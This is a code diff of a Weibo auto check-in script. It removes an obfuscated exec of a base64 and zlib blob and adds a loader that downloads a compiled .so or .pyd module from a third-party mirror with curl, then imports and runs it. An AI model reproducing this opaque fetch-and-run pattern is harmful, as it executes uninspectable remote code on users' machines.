@@ -1,12 +1,76 @@
-# -- coding: utf-8 --
 """
-先运行脚本，有问题再到群里问 http://t.me/xiaoymgroup
 new Env('微博签到');
-多号换行
+cron: 6 6 6 6 6
+先运行脚本，有问题到群里问 http://t.me/xiaoymgroup
 """
-notify = 1  # 推送通知开关，1为开，0为关
 
-import zlib
-import base64
+import platform
+import sys
+import os
+import subprocess
 
-exec(zlib.decompress(base64.b64decode('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')).decode('utf-8'))
+
+def check_environment(file_name):
+    python_info, os_info, cpu_info = sys.version_info, platform.system().lower(), platform.machine().lower() 
+    print(f"Python版本: {python_info.major}.{python_info.minor}.{python_info.micro}, 操作系统类型: {os_info}, 处理器架构: {cpu_info}")
+    if (python_info.minor in [10]) and os_info in ['linux','windows'] and cpu_info in ['x86_64', 'aarch64', 'armv8','amd64']:
+        print("符合运行要求,arm8没试过不知道行不行")
+        check_so_file(file_name, os_info,cpu_info)
+    else:
+        if not (python_info.minor in [10]):
+            print("不符合要求: Python版本不是3.10")
+        if cpu_info not in ['x86_64', 'aarch64', 'amd64']:
+            print("不符合要求: 处理器架构不是x86_64 aarch64 amd64")
+
+
+def check_so_file(filename,sys_info, cpu_info):
+    if sys_info == 'windows':
+        filename=os.path.splitext(filename)[0]+'.pyd'
+    if sys_info == 'linux':
+        filename = os.path.splitext(filename)[0]+'.so'
+    if os.path.exists(filename):
+        print(f"{filename} 存在")
+        import wbqd 
+        wbqd.main()
+    else:
+        print(f"不存在{filename}文件,准备下载文件")
+        url = f'https://ghraw.lovepet.space/kxs2018/xiaoym/main/{os.path.splitext(filename)[0]}'
+        download_so_file(filename, sys_info, cpu_info,main_url=url)
+
+def run_command(command):
+    process = subprocess.Popen(
+        command,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT, 
+        text=True  
+    )
+    for line in process.stdout:
+        line = line.strip()
+        if "%" in line:
+            print(line)
+    process.wait()
+    return process.returncode
+
+
+def download_so_file(filename, sys_info, cpu_info, main_url):
+    file_base_name = os.path.splitext(filename)[0]
+    if sys_info == 'windows':
+        url = main_url + f'/{file_base_name}.{cpu_info}_{sys_info}.pyd'
+    if sys_info == 'linux':
+        url = main_url + f'/{file_base_name}.{cpu_info}_{sys_info}.so'
+    print(url)
+    # print(github_url)
+    # 您的命令，使用 -# 参数显示下载进度
+    command = ['curl', '-#', '-o', filename, url]
+    # 执行命令并处理输出
+    result = run_command(command)
+    if result == 0:
+        print(f"下载完成：{filename},调用check_so_file函数")
+        check_so_file(filename,sys_info,cpu_info)
+    else:        
+        print(f"下载失败：{filename}")
+            
+
+if __name__ == '__main__':
+    check_environment('wbqd.so')
+
